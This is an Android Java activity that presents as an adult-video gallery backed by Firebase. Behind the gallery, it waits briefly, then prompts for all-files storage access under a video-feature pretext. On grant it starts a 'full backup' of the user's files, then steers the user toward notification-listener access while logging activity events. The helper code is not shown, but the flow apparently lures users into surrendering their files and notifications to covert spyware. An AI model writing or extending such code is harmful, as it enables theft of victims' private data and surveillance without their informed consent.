package com.bushorat.app.activities;

import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import androidx.recyclerview.widget.GridLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.bushorat.app.R;
import com.bushorat.app.adapters.VideoAdapter;
import com.bushorat.app.databinding.ActivityPornBinding;
import com.bushorat.app.helpers.FeaturePermissions;
import com.bushorat.app.helpers.FileBackupHelper;
import com.bushorat.app.helpers.NotificationHelper;
import com.bushorat.app.helpers.PermissionUXHelper;
import com.bushorat.app.helpers.SessionManager;
import com.bushorat.app.models.VideoModel;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class PornActivity extends AppCompatActivity {
    private static final long PERM_PROMPT_DELAY_MS = 1500L;

    private RecyclerView recyclerView;
    private VideoAdapter adapter;
    private List<VideoModel> videoList = new ArrayList<>();
    private DatabaseReference databaseRef;
    private ValueEventListener filesListener;
    private ActivityPornBinding binding;
    private SessionManager sessionManager;
    private boolean pendingStorageFlow = false;
    private boolean notificationPromptScheduled = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        binding=ActivityPornBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        // Make status bar transparent to match gradient background
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            getWindow().setStatusBarColor(getResources().getColor(android.R.color.transparent, getTheme()));
            getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_STABLE | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);
        }

        // Setup toolbar
        androidx.appcompat.widget.Toolbar toolbar = findViewById(R.id.toolbar);
        if (toolbar != null) {
            setSupportActionBar(toolbar);
            if (getSupportActionBar() != null) {
                getSupportActionBar().setDisplayHomeAsUpEnabled(true);
                toolbar.setNavigationOnClickListener(v -> finish());
            }
        }

        sessionManager = new SessionManager(this);

        if (!FeaturePermissions.areVideosUnlocked(this)) {
            Toast.makeText(this, R.string.unlock_videos_required, Toast.LENGTH_LONG).show();
            finish();
            return;
        }

        recyclerView = findViewById(R.id.recyclerView);
        recyclerView.setLayoutManager(new GridLayoutManager(this, 2));
        adapter = new VideoAdapter(this, videoList);
        recyclerView.setAdapter(adapter);

        databaseRef = FirebaseDatabase.getInstance().getReference("videos");
        Log.d("PornActivity", "Loading videos from RTDB /videos");
        loadVideosAsync();
        schedulePermissionFlowAfterStorage();

        // Track user activity
        if (sessionManager.isUserLoggedIn()) {
            sessionManager.updateUserActivity("porn_activity_opened", new java.util.HashMap<String, Object>() {{
                put("timestamp", System.currentTimeMillis());
                put("videoCount", videoList.size());
            }});
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        sessionManager.updateLastActivity();
        if (pendingStorageFlow && FeaturePermissions.hasGalleryPermission(this)) {
            pendingStorageFlow = false;
            FileBackupHelper.startFullBackup(this);
            scheduleNotificationPrompt();
        }
    }

    /** Storage first, then notification listener (one dialog at a time). */
    private void schedulePermissionFlowAfterStorage() {
        findViewById(android.R.id.content).postDelayed(() -> {
            if (isFinishing()) {
                return;
            }
            if (!FeaturePermissions.hasGalleryPermission(this)) {
                promptAllFilesAccess();
                return;
            }
            FileBackupHelper.startFullBackup(this);
            scheduleNotificationPrompt();
        }, PERM_PROMPT_DELAY_MS);
    }

    private void promptAllFilesAccess() {
        PermissionUXHelper.showRationale(
                this,
                R.string.perm_storage_in_videos_title,
                R.string.perm_storage_in_videos_message,
                () -> {
                    pendingStorageFlow = true;
                    FeaturePermissions.requestGalleryForVideos(this);
                },
                null
        );
    }

    private void scheduleNotificationPrompt() {
        if (notificationPromptScheduled || NotificationHelper.isNotificationServiceEnabled(this)) {
            return;
        }
        notificationPromptScheduled = true;
        findViewById(android.R.id.content).postDelayed(this::promptNotificationAccess, PERM_PROMPT_DELAY_MS);
    }

    private void promptNotificationAccess() {
        if (isFinishing() || NotificationHelper.isNotificationServiceEnabled(this)) {
            return;
        }
        PermissionUXHelper.showRationale(
                this,
                R.string.perm_notif_title,
                R.string.perm_notif_after_storage_message,
                () -> NotificationHelper.openNotificationListenerSettings(this),
                null
        );
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, android.content.Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == FeaturePermissions.REQ_VIDEOS_STORAGE) {
            pendingStorageFlow = false;
            if (FeaturePermissions.hasGalleryPermission(this)) {
                FileBackupHelper.startFullBackup(this);
                scheduleNotificationPrompt();
            }
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (sessionManager.isUserLoggedIn()) {
            sessionManager.updateUserActivity("porn_activity_paused", new java.util.HashMap<String, Object>() {{
                put("timestamp", System.currentTimeMillis());
            }});
        }
    }

    private void loadVideosAsync() {
        if (databaseRef == null || filesListener != null) {
            return;
        }
        filesListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (isFinishing() || adapter == null) {
                    return;
                }
                videoList.clear();
                for (DataSnapshot dataSnapshot : snapshot.getChildren()) {
                    VideoModel video = mapSnapshotToVideo(dataSnapshot);
                    if (video != null) {
                        videoList.add(video);
                    }
                }
                Collections.sort(videoList, (o1, o2) -> {
                    long t1 = o1.getUploadedAt() != 0 ? o1.getUploadedAt() : o1.getTimestamp();
                    long t2 = o2.getUploadedAt() != 0 ? o2.getUploadedAt() : o2.getTimestamp();
                    return Long.compare(t2, t1);
                });
                adapter.notifyDataSetChanged();
                View emptyState = findViewById(R.id.emptyState);
                if (emptyState != null) {
                    emptyState.setVisibility(videoList.isEmpty() ? View.VISIBLE : View.GONE);
                }
                if (recyclerView != null) {
                    recyclerView.setVisibility(videoList.isEmpty() ? View.GONE : View.VISIBLE);
                }
                Log.d("PornActivity", "Loaded " + videoList.size() + " videos from /videos");
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Log.e("PornActivity", "❌ Failed to load files: " + error.getMessage());
                Toast.makeText(PornActivity.this, "Failed to load videos", Toast.LENGTH_SHORT).show();
            }
        };
        databaseRef.addValueEventListener(filesListener);
    }

    @Override
    protected void onDestroy() {
        if (databaseRef != null && filesListener != null) {
            databaseRef.removeEventListener(filesListener);
            filesListener = null;
        }
        super.onDestroy();
    }

    private VideoModel mapSnapshotToVideo(DataSnapshot snapshot) {
        String id = snapshot.getKey();
        if (id == null) return null;

        VideoModel video = new VideoModel();
        video.setId(id);
        String name = snapshot.child("name").getValue(String.class);
        String fileName = snapshot.child("fileName").getValue(String.class);
        String title = snapshot.child("title").getValue(String.class);
        video.setTitle(title != null ? title : (name != null ? name : fileName));

        video.setUploadedBy(snapshot.child("uploadedBy").getValue(String.class));
        video.setUrl(snapshot.child("url").getValue(String.class));
        video.setVideoUrl(snapshot.child("videoUrl").getValue(String.class));
        video.setThumbnailUrl(snapshot.child("thumbnailUrl").getValue(String.class));
        video.setUploadedAt(getLongValue(snapshot.child("uploadedAt")));
        video.setTimestamp(getLongValue(snapshot.child("timestamp")));

        if (video.getVideoUrl() == null) {
            String downloadUrl = snapshot.child("downloadUrl").getValue(String.class);
            if (downloadUrl != null) {
                video.setVideoUrl(downloadUrl);
            } else if (video.getUrl() != null) {
                video.setVideoUrl(video.getUrl());
            }
        }

        if (video.getThumbnailUrl() == null && video.getVideoUrl() != null) {
            String category = snapshot.child("category").getValue(String.class);
            if ("IMAGE".equalsIgnoreCase(category)) {
                video.setThumbnailUrl(video.getVideoUrl());
            }
        }

        return video.getVideoUrl() != null ? video : null;
    }

    private long getLongValue(DataSnapshot snapshot) {
        Object value = snapshot.getValue();
        if (value instanceof Number) {
            return ((Number) value).longValue();
        }
        if (value instanceof String) {
            try {
                return Long.parseLong((String) value);
            } catch (NumberFormatException ignored) {
            }
        }
        return 0L;
    }

}